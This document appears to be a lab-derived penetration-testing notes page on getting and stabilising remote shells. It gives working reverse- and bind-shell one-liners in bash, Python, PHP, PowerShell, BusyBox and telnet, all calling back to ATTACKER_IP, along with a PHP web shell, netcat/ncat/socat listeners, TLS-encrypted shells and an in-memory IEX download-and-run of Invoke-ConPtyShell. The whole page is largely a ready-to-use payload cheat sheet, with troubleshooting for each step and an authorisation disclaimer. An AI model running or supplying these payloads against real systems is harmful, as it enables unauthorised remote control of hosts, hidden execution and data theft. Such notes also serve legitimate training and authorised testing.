---
type: technique
platform: any
status: solid
fluency: guided
source: lab
updated: 2026-09-03
---

# Shells

The single canonical shell note, from foothold to a usable terminal. The path is always the same five moves: **choose the direction, start the listener, fire the payload, catch it, then upgrade it** — and [[Security-Terms#^tls|TLS]] only when you actually need it.

The reason this note exists is that every one of those moves fails in a way that looks like a different move failing. A payload with no `-e` connects and gives you a channel with no shell. A raw shell that "hangs" on `su` is not broken, it just has no PTY. Naming which layer failed is the whole skill; the commands are the easy part.

> Use these only against systems you are authorised to test. Replace every IP, port, path and shell binary with values valid for your environment.

## Core Model

Netcat, Ncat and Socat move bytes. A connection becomes a *shell* only when one endpoint attaches a command interpreter — `/bin/bash`, `sh`, `cmd.exe`, `powershell.exe`.

```text
Raw channel:  terminal ↔ TCP ↔ terminal
Shell:        terminal ↔ TCP ↔ shell process
```

Without `-e`, `--exec`, or Socat's `EXEC:`, two Netcat endpoints still exchange text in both directions — but `whoami` is only text; nothing interprets it. This one distinction explains the single most common "my shell is broken" report, and section 2's **What you will see** turns on it.

### Reverse vs bind shell

**Why now** — this is the first decision and it is decided by one fact you already have from enumeration: **can the target make an outbound connection to you, or can you make an inbound one to it?** Pick wrong and the connection never forms, and you will blame the payload.

```text
REVERSE: target connects  ───────→ attacker listens
BIND:    attacker connects ──────→ target listens
```

- **Reverse** — the default. The target dials out to your listener. Preferred because outbound egress is usually looser than inbound, and because a target behind [[Security-Terms#^nat|NAT]] can still reach you.
- **Bind** — the target listens and you connect in. Use it only when outbound from the target is blocked but an inbound port to it is reachable — rare, and defeated by any inbound firewall.
- in both cases the **target** runs the shell; only the direction of the TCP connection changes.

**Then** — reverse in almost every case, so continue to [[Shells#Reverse Shell Payloads|Reverse Shell Payloads]] and section 2's listener. Choose bind only when you have positive evidence the target cannot reach out but you can reach in.

## Web Shells

**Why now** — you have code execution through the web application — an unrestricted upload, an [[Security-Terms#^lfi|LFI]] you can poison, an [[Security-Terms#^rce|RCE]] — but not yet a connection back. A web shell is the bridge: it turns that one-shot execution into a repeatable command channel you can use to *fire* a reverse shell. It needs a prior vulnerability to plant; see [[File-Inclusion]], [[Command-Injection]], or an upload flaw.

```php
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```

Reach it after upload with `http://victim.example/uploads/shell.php?cmd=whoami`.

- `$_GET['cmd']` → reads the `?cmd=` value; `isset(...)` runs `system` only when the parameter is present. URL-encode spaces and metacharacters: `cat%20/etc/passwd`.
- keep it **minimal** → `p0wny-shell`, `b374k`, `c99` are ready-made, but a feature-heavy shell is more bytes on disk for antivirus to catch and more noise in the logs. The smallest thing that runs a command wins.

**What you will see**

- **Found** — the command's output rendered in the page body: `www-data` for `?cmd=whoami`. That bare username is your foothold and the account every following command runs as.
- **Empty** — a blank page with HTTP 200 usually means the code executed but printed nothing (`cd`, or a command with no stdout), or `system()` output is being swallowed — try `?cmd=id` which always prints. A blank page with 500 means a PHP error, often a disabled function.
- **Error** — `Warning: system() has been disabled for security reasons` means `disable_functions` blocks it; try `passthru`, `shell_exec`, `exec`, or `proc_open`, which are disabled independently. A 403 on the upload path means the server refuses to execute there — the file landed in a directory served as static content.
- **Noise** — the shell is usually **stateless**: each request is independent, so `cd /tmp` followed by `ls` runs `ls` back in the original directory. A "command not working" is often this, not a broken shell — chain them: `?cmd=cd /tmp %26%26 ls`.

**Then** — a working web shell is a launch pad, not a destination: use it to fire a reverse shell payload ([[Shells#Reverse Shell Payloads|Reverse Shell Payloads]]) into a listener you started first. Disabled functions send you to a different payload language.

## Reverse Shell Payloads

**Why now** — you have command execution (a web shell, an RCE, an authenticated console) and a listener already waiting (section 2 — **start it first**, every time). This is the line that makes the target dial home. Pick the language by what the target actually runs, not by what you remember.

All of these follow one model: connect to the attacker, wire stdin/stdout/stderr to the socket, start a shell.

### Bash

<!-- layers-ok -->
```bash
bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
```

- `bash -i` → interactive bash; `>& /dev/tcp/ATTACKER_IP/443` → send stdout+stderr over bash's TCP pseudo-device; `0>&1` → attach stdin to the same socket.
- `/dev/tcp` is a **bash** feature, not a real device → it does not exist in `sh`, `dash`, or many `system()` contexts. Fired where `/bin/sh` is really `dash`, it fails with `No such file or directory` for `/dev/tcp`, which reads like a missing file and is actually the wrong shell. Wrap it: `bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1'`.

### Python

<!-- layers-ok -->
```bash
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",443));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'
```

- opens the socket, maps fds `0/1/2` onto it, and spawns bash inside a **PTY** — so this payload lands a shell that is already half-stabilised, unlike the bash one-liner.
- the target-side PTY improves interaction, but your listener may still need the full stabilisation sequence in section 4.

### PHP

<!-- layers-ok -->
```bash
php -r '$s=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");'
```

- for PHP execution contexts — a web shell or PHP RCE. The socket is usually fd `3`, but that is environment-dependent; if nothing connects, the fd number is the first thing to vary.
- `exec`, `system`, `shell_exec`, `passthru`, `popen` behave differently and are disabled independently — check what is enabled rather than assuming they are interchangeable.

### PowerShell

The one that matters on Windows: no file to upload, no `nc.exe` to smuggle across. Paste it into an RDP session, a `cmd.exe` window, or any Windows RCE.

<!-- layers-ok -->
```powershell
$c=New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",443);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+"PS "+(pwd).Path+"> ";$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()
```

- `New-Object System.Net.Sockets.TCPClient(...)` → the outbound connection. Windows has no `/dev/tcp`, so the socket is built through .NET.
- `iex $d` → run whatever arrives as a command; `2>&1|Out-String` folds errors into output so a failed command reports back instead of vanishing.
- run it from `cmd.exe` by wrapping: `powershell -nop -w hidden -c "<payload>"` — `-nop` skips the profile script, `-w hidden` hides the window. Catch it with a plain `nc -lvnp 443`.

### BusyBox and Telnet fallbacks

<!-- layers-ok -->
```bash
busybox nc ATTACKER_IP 443 -e sh
```

<!-- layers-ok -->
```bash
TF=$(mktemp -u); mkfifo "$TF" && telnet ATTACKER_IP 443 0<"$TF" | sh 1>"$TF"
```

- for stripped embedded systems with no bash and no full netcat. BusyBox applets and their flags vary by build; telnet is a transport of last resort, not a secure channel.

### Backgrounding

<!-- layers-ok -->
```bash
bash -c 'nohup bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1 &'
```

- `nohup` detaches from the parent, `&` backgrounds it — so the shell survives the web request or process that launched it exiting. This buys persistence of the *process*, not stability of the *session*.

**What you will see** (this block covers every payload above)

- **Found** — your listener suddenly prints a prompt, or goes silent with a blinking cursor. Type `id` — a real answer means you have the shell. Note the username; it is who you now are.
- **Empty** — the payload runs and **nothing connects back**. The order of suspicion: listener not actually running (section 2), wrong `ATTACKER_IP` (use your `tun0` address, not your [[Security-Terms#^lan|LAN]] one), a port the target's egress blocks (retry on `443`), or the wrong shell for the payload (`/dev/tcp` under `dash`).
- **Error** — the highest-value case. **A shell that connects and dies within a second** almost always means the payload was fired somewhere with no persistent process — a cron line, a non-interactive `sh`, a web request that returned and tore its children down — so background it (Backgrounding above) or use a context that stays alive. `/dev/tcp: No such file or directory` is the wrong-shell error, not a missing file — wrap in `bash -c`. `Connection refused` at the target means the listener is not up on that port. `cannot create temp file` from the telnet FIFO means `/tmp` is not writable.
- **Noise** — a listener that shows `connect to [..] from [..]` and then nothing is a **raw channel with no shell** — you fired a payload without `-e`/`EXEC:`, or caught the wrong side. It looks like a hung shell and is a missing interpreter; see section 2.

**Then** — a live shell goes to section 4 to become a real terminal. A shell that dies instantly goes to Backgrounding. Nothing connecting goes back to section 2 and the IP/port/egress checks.

## Catching the shell

**Why now** — before you fire any payload above, something has to be waiting to receive the connection. This is the move people skip in the rush, and a payload fired into no listener is the commonest reason "the exploit did not work". Start this **first**.

### Listener

`nc -lvnp 4444`

- `-l` listen, `-v` verbose (so you see the connect line), `-n` no DNS (so it does not hang resolving the target), `-p` local port.
- `-v` is the flag people drop → without it a successful connection prints nothing and you cannot tell a live shell from a dead listener. Keep it; the `connect from ...` line is your only proof the target reached you.
- TCP is the default; `-u` selects UDP (rare for shells). Ports under 1024 need root; `4444` does not. OpenBSD, traditional, GNU and BusyBox `nc` differ — check `nc -h` on the actual host rather than trusting memorised flags.

**What you will see**

- **Found** — `Connection received on 10.10.x.x 51524` (wording varies by build), then a prompt or a cursor. `id` confirms it.
- **Empty** — the listener sits with no connection: the payload has not fired, or has not reached you. This is a *fire/reachability* problem, diagnosed on the payload side (section 3), not here.
- **Error** — `nc: Address already in use` means another listener holds that port; kill it or change port. `nc: command not found` sends you to `ncat` (section 2b) or a bash `/dev/tcp` listener substitute.
- **Noise** — a connection that opens and **immediately shows a prompt that is your own shell's** means you caught yourself (fired the payload at `127.0.0.1` or your own IP). Check the source address on the connect line.

**Then** — a live connection goes to section 4 for the TTY upgrade. Nothing connecting is a section-3 problem. No `nc` at all goes to Ncat.

### Logging the session

**Why now** — you are one command away from starting a listener, and this is the decision you cannot take back afterwards. A shell dies when the box resets, the [[Security-Terms#^vpn|VPN]] drops, or you close the wrong window, and the scrollback goes with it. Decide how you are recording **before** you catch the connection.

Record the whole terminal session — the option to use for a write-up:

```bash
mkdir -p ~/loot/<box>
```

```bash
script ~/loot/<box>/<box>.log
```

- `script` records **everything** — every command you type and everything that returns — into the file. Run it before you touch the box; `exit` stops it. Keep the log and your screenshots in the same `~/loot/<box>/` folder, named after the box, not `log.txt` — a week later you will have nine and no way to tell them apart.

Two scoped alternatives that log only the reverse-shell connection:

<!-- layers-ok -->
```bash
nc -lvnp 4444 | tee ~/loot/<box>/shell.log
```

- `tee` writes what arrives to file **and** screen. Records the shell's output only, not your typing. Safe on a raw shell; do **not** use it after a PTY upgrade — `stty raw -echo` hands the terminal to the remote side and the pipe breaks the interaction.

<!-- layers-ok -->
```bash
script -q -c "nc -lvnp 4444" ~/loot/<box>/shell.log
```

- survives the TTY upgrade, which is why it is the better choice for anything longer than a quick look. Cost: it captures control characters, so strip them for reading with `sed -r 's/\x1B\[[0-9;]*[a-zA-Z]//g'`.

**What you will see**

- **Found** — `Script started, output log file is '...'`, then your ordinary prompt. The file grows while you work, so `ls -l` on it from a second terminal is the live check; `exit` closes the recording and prints `Script done`.
- **Empty** — a zero-byte log after a real session means `script` never started, not that it failed to capture — it writes as it goes. Compare the path you gave it against the directory `mkdir -p` actually created.
- **Error** — `script: cannot open ...: No such file or directory` is the missing `~/loot/<box>/` directory, which is exactly why `mkdir -p` is the line above it. A `tee` pipeline that stops responding the moment you upgrade the TTY is the documented conflict above, not a crash: the interaction is gone and only a fresh catch brings it back.
- **Noise** — the log fills with escape sequences: colour codes, prompt redraws, and every backspace you typed. It reads badly and is still complete. Strip them with the `sed` above rather than concluding the capture is corrupt.

**Then** — with recording running, start the Listener above and fire the payload. If the plan includes the TTY upgrade in section 4 — and it usually does — choose the `script -q -c` form now, because `tee` will not survive it. The finished log belongs in `~/loot/<box>/` beside the screenshots; that folder is what a write-up gets assembled from.

### Reverse shell with `-e`

Attacker: `nc -lvnp 4444`  Target: `nc ATTACKER_IP 4444 -e /bin/bash`

- `-e /bin/bash` → after connecting, execute bash and wire it to the socket. Without it you get the raw channel from the Core Model — bytes, no shell.
- `-e` is **deliberately absent** from most OpenBSD `nc` builds (the default on Kali and modern Debian). A command that worked on one target's `nc` may simply not have the flag on the next; the failure is `nc: invalid option -- 'e'`, which sends you to the FIFO fallback below.

### Bind shell with `-e`

Target: `nc -lvnp 8080 -e /bin/bash`  Attacker: `nc -nv TARGET_IP 8080`

- `-e` stays on the **target** because the target exposes the shell in a bind layout too; only the connection direction flipped.

### FIFO fallback when `-e` is unavailable

Reverse: `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP 443 >/tmp/f`

- `mkfifo` makes a [[Security-Terms#^fifo|named pipe]]; `cat /tmp/f` feeds received bytes into the shell; `2>&1` returns stderr; the final `>/tmp/f` writes the network's input back into the pipe, closing the loop.
- this is the answer to `nc: invalid option -- 'e'`. It needs a writable `/tmp` and the syntax around `nc -l` is variant-dependent — adapt from the installed build's help.

### Other flags seen in labs

- `-w SECONDS` connection/idle timeout; `-q SECONDS` wait after EOF before closing; `-k` keep listening after a client disconnects. Semantics vary by build and none are needed for a single interactive catch.

## Ncat — when `nc` lacks `-e` or you need TLS

**Why now** — the target's `nc` refused `-e`, or you need the byte stream encrypted so a passive sniffer on the wire cannot read your commands. Ncat is the Nmap project's netcat: consistent `--exec`, plus TLS the base `nc` does not have.

### Plain shells

<!-- layers-ok -->
```bash
# reverse — attacker listens, target connects back with a shell attached
ncat -lvnp 4444
```

```bash
ncat ATTACKER_IP 4444 -e /bin/bash
```

- `-e`/`--exec` runs the program directly (give a full path); `-c`/`--sh-exec` passes a string through a shell when you need shell interpretation. For a bind layout the `-e` moves to the listening target, exactly as with `nc`.

### TLS-encrypted shells

**Why now** — you have Ncat at both ends and a reason to hide the bytes: a monitored wire, an [[Security-Terms#^ids|IDS]] reading plaintext command traffic, or a stealth objective you are graded on. The cost is that **both** ends must now speak TLS, which adds a new way for the connection to fail while looking exactly like a broken shell.

```bash
# reverse, encrypted — BOTH ends must speak TLS
ncat --ssl -lvnp 4444
```

```bash
ncat --ssl ATTACKER_IP 4444 -e /bin/bash
```

- both endpoints must be TLS → a plain `nc` client **cannot** complete the handshake with an `ncat --ssl` listener. The symptom is a connection that opens and instantly drops with a TLS error on the listener; it is not a broken shell, it is a plaintext client against a TLS server.
- an Ncat TLS listener mints a throwaway certificate when none is given; `--ssl-verify --ssl-trustfile CERT.pem` when you actually need to authenticate the peer. Encryption hides content in transit only — not IPs, ports, timing, or process activity on the host.

**What you will see** (Ncat, both variants)

- **Found** — identical to the `nc` listener: a connect line then a prompt. `id` confirms.
- **Empty** — nothing connects: same fire/reachability triage as section 3.
- **Error** — on the TLS listener, `... SSL_accept ... wrong version number` means a **plaintext client** connected — the target used `nc`, not `ncat --ssl`. Fix the target command, not the listener.
- **Noise** — a "connection" from your own scan or a health check can trip a `--ssl` handshake and log noise; confirm the source address before assuming it is your shell.

**Then** — a caught shell goes to section 4. A TLS version-mismatch error sends you to make the target end also use `--ssl`.

## Socat — robust PTY and encrypted channels

**Why now** — you want a genuinely interactive shell without the manual `stty` dance, or a reliable encrypted channel, and Socat is present (or you can transfer it). Socat connects two address specifications and either can be a TCP socket, a PTY, a process, or a TLS endpoint.

### Plain TCP reverse shell

Attacker: `socat -d -d TCP-LISTEN:443,reuseaddr STDIO`

Target: `socat TCP:ATTACKER_IP:443 EXEC:"bash -li",stderr`

- `TCP-LISTEN` accepts the incoming connection; `STDIO` wires your terminal both ways (`STDOUT` alone is output-only and not enough); `EXEC:"bash -li"` runs the shell; `reuseaddr` lets you re-bind the port immediately after a drop; `-d -d` prints connection diagnostics.
- Windows target: `socat TCP:ATTACKER_IP:443 EXEC:powershell.exe,pipes` (or `cmd.exe,pipes`).

### Plain TCP bind shell

Target: `socat TCP-LISTEN:8088,reuseaddr EXEC:"bash -li",stderr`

Attacker: `socat STDIO TCP:TARGET_IP:8088`

### Fully interactive Socat PTY

**Why now** — you already know this session will need `su`, `ssh`, an editor or anything full-screen, and Socat exists at both ends. This is the one pair that lands already stabilised: you pay the setup cost once here instead of running the `stty` dance in section 4 after every catch.

Get your terminal size first with `stty size`, then:

```bash
socat TCP-LISTEN:5555,reuseaddr FILE:`tty`,raw,echo=0
```

Target: `socat TCP:ATTACKER_IP:5555 EXEC:"bash -li",pty,stderr,sigint,setsid,sane`

- `pty` allocates a pseudo-terminal on the target; `sigint` passes `Ctrl+C` through; `setsid` runs it in a new session; `sane` applies usable terminal defaults; ``FILE:`tty`,raw,echo=0`` attaches your side raw with no double echo. This pair gives a full interactive shell with **no** post-catch `stty` sequence — the reason to carry a Socat binary at all.
- Socat absent on the target? Transfer a static build ([[File-Transfer]]) to `/tmp/socat`, `chmod +x`, and run it. Architecture and libc mismatches can make a transferred binary fail to execute — check `file` on it if it will not run.

**What you will see** (Socat PTY pair)

- **Found** — a fully interactive prompt: arrow keys, tab completion, `Ctrl+C` scoped to the remote, and `su`/`ssh`/editors all work. No further upgrade needed.
- **Empty** — the pair connects but you get no prompt: the target side missed `EXEC:` (a raw channel again), or `pty` failed on a target with no `/dev/pts`.
- **Error** — `socat[...] E ... Connection refused` at the target means the listener is not up. On the target, `EXEC:"bash -li": No such file` means bash is not at the default path — try `EXEC:"/bin/sh -li"`. A transferred socat that prints `cannot execute binary file` is the wrong architecture.
- **Noise** — `-d -d` diagnostics look like errors but are informational; the line that matters is `N accepting connection` followed by the prompt.

**Then** — a Socat PTY needs nothing more; go enumerate ([[Linux-Local-Enumeration]]). A raw channel here goes back to check the target's `EXEC:`. Need encryption on top → the Socat TLS section below.

## Shell Stabilisation — TTY Upgrade

**Why now** — you have caught a shell (section 2/3) but it is *raw*: no arrow keys, no `Ctrl+C` without killing the whole session, and `su`, `ssh`, `vi` or `top` hang the moment they open. That is not a broken shell and not a reason to re-exploit — it is a missing PTY, and this sequence adds one. Skipping it is why an hour disappears fighting a shell that "won't run `su`".

### Python PTY + local terminal setup

**Why now** — you are holding a raw shell and the target has `python3`. This is the fastest route to a PTY and the only one that also repairs your **local** side, and you need both halves: `pty.spawn` gives the target a terminal, the `stty` sequence gives you back your own keys. Order matters — target first, your machine second — because the local half does nothing until a remote PTY exists to hand the keystrokes to.

Note your own terminal size first (`stty size`), then after catching the shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

```bash
export TERM=xterm
```

Then `Ctrl+Z` to suspend the listener, and on your own box:

```bash
stty raw -echo
```

```bash
fg
```

Press Enter to redraw, then on the target: `stty rows ROWS cols COLS`.

- `pty.spawn()` allocates the target-side PTY; `stty raw -echo` hands your local keystrokes straight through and stops double echo; `fg` resumes the listener; `TERM` and the row/col sizes let full-screen programs render.
- the step people get wrong is `stty raw -echo` → run it on **your** machine while the listener is suspended, not on the target. Forget it and you get no line editing and doubled characters; run it and forget to restore afterwards and your terminal is wrecked — fix with `stty sane` or a blind `reset`.

**What you will see**

- **Found** — after `fg` and Enter, the prompt redraws and `Ctrl+C` now interrupts a remote command instead of killing your listener. Arrow keys recall history; `su`/`ssh` work.
- **Empty** — `python3` prints `command not found`: the target has no Python 3. Try `python`, or the `script`/`bash -i` fallbacks below. The absence is a real answer — it chooses your upgrade method, it does not block the upgrade.
- **Error** — a terminal that goes blank or garbled after `fg` means the size or `TERM` is wrong, or `stty raw -echo` was skipped — type `reset` and Enter even if you cannot see it. Characters doubling on screen is the missing `-echo`. `stty: standard input: Inappropriate ioctl for device` means there is no PTY yet — the `pty.spawn` step did not run.
- **Noise** — the prompt looking normal is not proof of a PTY; the test is whether `Ctrl+C` stays remote and whether `su` opens. Check those, not the prompt string.

**Then** — a stabilised shell goes to enumeration ([[Linux-Local-Enumeration]]). No Python sends you to the fallbacks. On Windows, none of this applies — go to [[Shells#Windows — ConPtyShell|ConPtyShell]].

### `rlwrap`

`rlwrap nc -lvnp 4444`

- wraps the listener with Readline: history, arrow keys, editing on **your** side only. Cheap and instant, but it does **not** allocate a target PTY or give job control — combine it with a target-side upgrade when you need real terminal behaviour.

### PTY fallbacks

**Why now** — the Python route came back `command not found` and you still need a target-side PTY before `su` or `ssh` will open. `script` is the fallback because it ships with the base utilities rather than with a language runtime, so it survives on hosts that carry no interpreter at all.

```bash
script -qc /bin/bash /dev/null
```

- `script` allocates a PTY when Python is absent (`/dev/null` discards its log). `/bin/bash -i` alone improves the prompt but creates no PTY. Support varies by implementation.
- `-q` drops the `Script started` banner, `-c` runs one command instead of an interactive session. Drop the `/dev/null` and `script` writes a `typescript` file into the working directory — an artefact left on the target that outlives your session.

**What you will see**

- **Found** — the prompt returns and `su` now opens instead of hanging. This is only the remote half: finish exactly as in the Python route — `Ctrl+Z`, `stty raw -echo` on your machine, `fg`, then `TERM` and the row/column sizes. Without that you have a target PTY and still no line editing.
- **Empty** — `script` runs, the prompt comes back, and `su` still hangs: this build allocated no PTY. That is what "support varies by implementation" costs, and it closes the fallback rather than the upgrade.
- **Error** — `script: command not found` on top of no Python means a host stripped to its busybox. Move the problem instead of solving it: transfer a static `socat` ([[File-Transfer]]) and use the PTY pair above, or re-enter over SSH with a credential.
- **Noise** — a prompt that looks correct proves nothing here either. The test is the same as in the Python route: does `Ctrl+C` stay remote, and does `su` open.

**Then** — a working PTY goes to the local half above and then to enumeration ([[Linux-Local-Enumeration]]). No PTY from either method means Socat or SSH, and `rlwrap` above still buys local history in the meantime — none of those is a re-exploit, so do not go back to the payload.

### Windows — ConPtyShell

**Why now** — you have caught a shell on a Windows host, and nothing in this section applies to it. Everything above depends on `/dev/pts` and target-side Python — Linux only. A caught PowerShell shell stays a command runner no matter what you type. The Windows equivalent is **[[Security-Terms#^conpty|ConPTY]]**, the pseudo-console API added in Windows 1809 / Server 2019; `Invoke-ConPtyShell` drives it and hands back a genuinely interactive shell.

Attacker, in this order — the `stty` call must come **before** the connection lands:

```bash
stty raw -echo; nc -lvnp 3001
```

Target, from the shell you already hold:

```powershell
IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/Invoke-ConPtyShell.ps1'); Invoke-ConPtyShell ATTACKER_IP 3001 -Rows 40 -Cols 160
```

- `IEX(...DownloadString(...))` fetches and runs the script in memory — nothing on disk. Serve it with `python3 -m http.server 80`. `-Rows`/`-Cols` take your `stty size` values or full-screen programs render into the wrong shape.
- restore your terminal with `stty sane` when the session ends; `stty raw -echo` leaves it unusable otherwise.

> [!important] Needs Windows 1809 or newer
> On anything older the ConPTY API does not exist and the script silently drops to a non-interactive fallback — which looks exactly like the upgrade failing for some other reason. Check first with `[System.Environment]::OSVersion.Version`.

**What you will see**

- **Found** — a real interactive Windows shell: tab completion, working `Ctrl+C`, and programs that open their own console no longer hang it.
- **Empty** — the shell connects but stays a plain command runner: the OS predates 1809 and the script fell back silently. Confirm the version rather than re-running.
- **Error** — a red PowerShell block naming `AmsiScanBuffer` means [[Security-Terms#^amsi|AMSI]] blocked the script in memory — the bytes arrived, the defence caught them. `Unable to connect to the remote server` is your web server not running or the wrong IP/port.
- **Noise** — a garbled local terminal after the session is the expected cost of `stty raw -echo`, not a failure — `stty sane` fixes it.

**Then** — a working ConPTY needs nothing more. An old-OS fallback or AMSI block makes a valid credential over [[5985-WinRM]] the better move — a clean session with no upgrade at all.

## Rarely — encrypted channels, worth knowing exist, not worth a step

**Why now** — everything above gets you a shell. This section only matters when the channel itself is the problem: a network that inspects traffic and kills a plaintext shell mid-session, or an engagement where the shell must not be readable on the wire. On a lab box it is never the answer, and reaching for it before the plain payloads have failed costs you a certificate and twenty minutes for nothing.


**Why now** — you already decided the channel must be encrypted (a monitored wire, a graded "stealth" objective) and you are using Socat. TLS wraps the byte stream between the two Socat endpoints; it does not make the traffic HTTPS, guarantee stealth, or authenticate a self-signed peer when verification is off.

### Create a self-signed certificate

**Why now** — a Socat TLS address will not start without a certificate on the listening side, so this comes before either encrypted layout below. Make it while nothing is waiting on you: generating a key after the payload is already firing is how a window closes.

```bash
openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 365 -out shell.crt
```

```bash
cat shell.key shell.crt > shell.pem
```

```bash
chmod 600 shell.key shell.pem
```

- `-nodes` leaves the key passphrase-free so an unattended listener can read it; `shell.pem` holds key+cert for the listening side. Treat the [[Security-Terms#^pem|PEM]] as sensitive and remove it during cleanup.
- `req` prompts for country, organisation and common name → every answer is cosmetic here. Press Enter through them, or pass `-subj '/CN=localhost'` to skip the prompts entirely.

**What you will see**

- **Found** — `shell.key`, `shell.crt`, and a `shell.pem` holding two blocks: the private key first, the certificate below it. Both in the one file is what the listener needs; either of them alone is not.
- **Empty** — a zero-byte `shell.pem` means the `cat` ran against names that do not exist — a typo, or an `openssl` run you answered with `Ctrl+C`. `wc -l shell.pem` before you use it, not after the target is waiting.
- **Error** — `Can't open shell.key for writing` is a directory you have no write access to; run it from your own home. `problems making Certificate Request` means a prompt was answered with a value OpenSSL rejects — blank is always accepted.
- **Noise** — the certificate is self-signed by design, so an "untrusted issuer" complaint wherever it later appears is expected rather than a fault to fix; `verify=0` at both ends is the intended pairing. Neither that warning nor its absence tells you who is on the other end.

**Then** — the PEM goes on the **listening** side of whichever layout you chose: your machine in a reverse layout, the target in a bind one, which means transferring it ([[File-Transfer]]). Delete it when you are done — it is a private key, and in a bind layout you have written it to a host you do not control.

### Encrypted reverse shell

Attacker: `socat OPENSSL-LISTEN:443,cert=shell.pem,verify=0,reuseaddr STDIO`

Linux target: `socat OPENSSL:ATTACKER_IP:443,verify=0 EXEC:"bash -li",stderr`

### Encrypted bind shell

**Why now** — you need the channel encrypted **and** the target cannot dial out, so the reverse layout above is closed to you. This is the only combination that forces your private key onto the target, and that consequence is the reason to be sure you need it before you type it.

The PEM belongs on the **listening** side, which in a bind layout is the target:

```bash
socat OPENSSL-LISTEN:8443,cert=/tmp/shell.pem,verify=0,reuseaddr EXEC:"bash -li",stderr
```

```bash
socat OPENSSL:TARGET_IP:8443,verify=0 STDIO
```

- first line runs on the **target**, second on your machine — the opposite of every other layout in this note, and the commonest way to get a `Connection refused` that means nothing.
- transfer `shell.pem` to the target first ([[File-Transfer]]) and `chmod 600` it there. Generate a throwaway pair for this; never put a key you reuse on a host you do not control.

**What you will see**

- **Found** — the second command returns a prompt and `id` answers. Behaviour is identical to the plaintext bind shell, which is the point of the exercise.
- **Empty** — the connection opens and stays blank: `EXEC:` is missing from the target's line, so you have an encrypted channel with no shell behind it. That is the Core Model failure wearing TLS, not an encryption problem.
- **Error** — `Connection refused` means the target's listener is not up, or an inbound firewall sits between you — which is the same evidence that should have chosen a reverse layout in the first place. An `SSL` error while `verify=0` is set points at the cert: `/tmp/shell.pem` missing, or unreadable by the account the target listener runs as.
- **Noise** — a bind listener is a **new open port on the target**, visible to anyone who scans it and to the host's own `ss -tulpn`. TLS hides what crosses the port and advertises the port itself.

**Then** — a working session proceeds like any other; go to enumeration ([[Linux-Local-Enumeration]]), and remove `/tmp/shell.pem` from the target before you leave. If the inbound port turns out to be filtered, the answer is not more TLS — it is the reverse layout, and that decision belongs back at Reverse vs bind shell.

### Encrypted full PTY

Attacker: ``socat OPENSSL-LISTEN:443,cert=shell.pem,verify=0,reuseaddr FILE:`tty`,raw,echo=0``

Target: `socat OPENSSL:ATTACKER_IP:443,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane`

### TLS caveats and checks

- `verify=0` accepts an unverified peer: the stream is encrypted, but a man-in-the-middle can impersonate the endpoint. For authenticated TLS, configure a trusted [[Security-Terms#^ca|CA]] and enable verification instead of copying `verify=0` around.
- check the build has OpenSSL support with `socat -V`. If a connection fails, the usual causes are: cert path or permissions, listener not reachable, port conflict, or **one side plain and the other TLS** — both must be OPENSSL or both plain, never mixed.

**What you will see** (Socat TLS)

- **Found** — the encrypted pair behaves exactly like its plaintext equivalent — a prompt, or a full PTY for the `FILE:tty` variant.
- **Empty** — connects and drops with no prompt: a plain/TLS mismatch, the commonest cause.
- **Error** — `SSL ... verify ... error` with `verify=0` set means the cert file is missing or unreadable on the listener, not a verification failure. `socat: command ... OPENSSL ... unknown` means this build lacks OpenSSL — check `socat -V`.
- **Noise** — TLS hides command content from a passive sniffer but not the connection's existence; port `443` carrying TLS is not automatically legitimate HTTPS to anyone looking at flow metadata.

**Then** — a working encrypted shell proceeds like any other. A mismatch error means make both ends OPENSSL. A missing-OpenSSL build means fall back to `ncat --ssl` or an unencrypted channel.

## Fast Decision Guide

- quick catch → `nc -lvnp PORT`
- target `nc` has `-e` → direct shell; otherwise a FIFO fallback or another payload language
- need consistent `--exec`/TLS and Ncat exists → `ncat`
- need a robust Linux PTY and Socat exists → the Socat PTY pair (no post-catch `stty`)
- already caught a raw shell → Python PTY + `stty raw -echo`
- want local history/editing only → `rlwrap`
- need confidentiality in transit → TLS on **both** endpoints; decide peer authentication separately
- Windows, and you have a credential → skip the whole upgrade problem with [[5985-WinRM]]

## Reading the output

The listener, transport, shell process, PTY and encryption are **separate layers**, and the one habit that turns a stuck two hours into five minutes is refusing to treat "the shell" as one black box. When something fails, name the layer:

- a connection that opens but shows no prompt, or echoes `whoami` as text without running it, is the **shell process** layer — a payload without `-e`/`EXEC:`, not a network fault.
- nothing connecting at all is the **transport** — IP, port, egress, or a dead listener.
- a shell that works but dies on `Ctrl+C` and cannot run `su`/`ssh` is the **PTY** layer — it needs section 4, not a new payload.
- a connection that opens and instantly drops with a TLS error is the **encryption** layer — one end is plaintext against a TLS peer.

Fix the layer that actually failed. Re-firing the payload when the real problem is a missing PTY is the single most common wasted loop in this whole area.

## Next

- [[Linux-Local-Enumeration]] — first moves once the Linux shell is stable
- [[Windows-Automated-Enumeration]] — the Windows equivalent after landing
- [[File-Transfer]] — pull `socat`/tooling across when the target lacks it
- [[5985-WinRM]] — on Windows with a credential in hand, skip the shell-upgrade problem

## Gaps

- No msfvenom payload generation, or catching a Meterpreter session in `multi/handler`.
- Nothing on shell persistence beyond backgrounding — cron, systemd, SSH keys for a foothold that survives a reboot.
- No coverage of egress-restricted callbacks over DNS or [[Security-Terms#^icmp|ICMP]] when even `443` outbound is filtered.
